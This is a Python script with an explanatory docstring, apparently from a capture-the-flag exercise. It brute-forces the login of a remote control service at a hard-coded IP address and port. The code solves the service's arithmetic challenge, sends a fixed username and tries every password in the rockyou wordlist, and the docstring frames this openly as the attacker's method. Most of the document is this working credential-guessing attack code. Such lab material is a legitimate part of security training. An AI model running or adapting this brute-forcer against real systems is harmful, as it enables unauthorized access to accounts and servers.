"""
    If you know the IP address of v0idcache's server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:

        $ nc <ip address here> <port here>

    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.

    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.

    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.

    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.

"""

import socket
import re
import time

host = "157.230.179.99" # IP address here
port = 1337 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file

def brute_force():

    with open(wordlist) as f:
        for line in f:
            password = line
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            s.connect((host, port))

            time.sleep(2)
            data = s.recv(1024)     # Receives 1024 bytes from IP/Port
            print(data)             # Prints data
            
            x = re.findall("([0-99]{1,2})\s([\-\+\*\/])\s([0-99]{1,2})", data)
            print(x)
            
            x1, x2, x3 = x[0]

            x1 = int(x1)
            x3 = int(x3)
            
            if x2 == '+':
                a = x1 + x3
                s.send(str(a) + "\n")
                data = s.recv(1024) 
                print(data)
                s.send("ejnorman84\n")
                data = s.recv(1024) 
                print(data)
                s.send(str(password) + "\n")
                time.sleep(1.5)
                data = s.recv(1024) 
                print(data)
                if "Fail" in str(data):
                    print(password)
                    s.close()
                else:
                    print(password)
                    break
                
                
                
            elif x2 == '-':
                a = x1 - x3
                s.send(str(a) + "\n")
                data = s.recv(1024) 
                print(data)
                s.send("ejnorman84\n")
                data = s.recv(1024) 
                print(data)
                s.send(str(password) + "\n")
                time.sleep(1.5)
                data = s.recv(1024) 
                print(data)
                if "Fail" in str(data):
                    print(password)
                    s.close()
                else:
                    print(password)
                    break
                
            elif x2 == '*':
                a = x1 * x3
                s.send(str(a) + "\n")
                data = s.recv(1024) 
                print(data)
                s.send("ejnorman84\n")
                data = s.recv(1024) 
                print(data)
                s.send(str(password) + "\n")
                time.sleep(1.5)
                data = s.recv(1024) 
                print(data)
                if "Fail" in str(data):
                    print(password)
                    s.close()
                else:
                    print(password)
                    break
                
                    
            elif x2 == '/':
                a = x1 / x3
                s.send(str(a) + "\n")
                data = s.recv(1024) 
                print(data)
                s.send("ejnorman84\n")
                data = s.recv(1024) 
                print(data)
                s.send(str(password) + "\n")
                time.sleep(1.5)
                data = s.recv(1024) 
                print(data)
                if "Fail" in str(data):
                    print(password)
                    s.close()
                else:
                    print(password)
                    break
                
if __name__ == '__main__':
    brute_force()
